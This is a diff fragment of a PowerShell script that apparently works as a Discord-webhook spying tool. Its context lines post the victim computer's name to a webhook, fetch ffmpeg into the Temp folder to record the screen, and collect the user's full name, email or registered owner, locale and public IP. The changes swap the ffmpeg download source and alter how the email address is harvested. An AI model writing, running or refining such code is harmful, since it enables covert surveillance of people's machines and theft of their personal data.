@@ -328,8 +328,15 @@ $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclock
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
-$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
-iwr -Uri $url -OutFile $Path
+$zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.0-essentials_build.zip'
+$tempDir = "$env:temp"
+$zipFilePath = Join-Path $tempDir 'ffmpeg-6.0-essentials_build.zip'
+$extractedDir = Join-Path $tempDir 'ffmpeg-6.0-essentials_build'
+Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
+Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
+Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
+Remove-Item -Path $zipFilePath -Force
+Remove-Item -Path $extractedDir -Recurse -Force
 }
 sleep 1
 
@@ -351,8 +358,15 @@ $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclock
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
-$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
-iwr -Uri $url -OutFile $Path
+$zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.0-essentials_build.zip'
+$tempDir = "$env:temp"
+$zipFilePath = Join-Path $tempDir 'ffmpeg-6.0-essentials_build.zip'
+$extractedDir = Join-Path $tempDir 'ffmpeg-6.0-essentials_build'
+Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
+Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
+Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
+Remove-Item -Path $zipFilePath -Force
+Remove-Item -Path $extractedDir -Recurse -Force
 }
 sleep 1
 $mkvPath = "$env:Temp\ScreenClip.mkv"
@@ -449,7 +463,7 @@ Remove-Item -Path $zipFilePath -Force
 
 Function SystemInfo{
 $userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
-$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches ;$email = ("$email").Trim()
+$email = (Get-ComputerInfo).WindowsRegisteredOwner
 $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
 $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
 $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
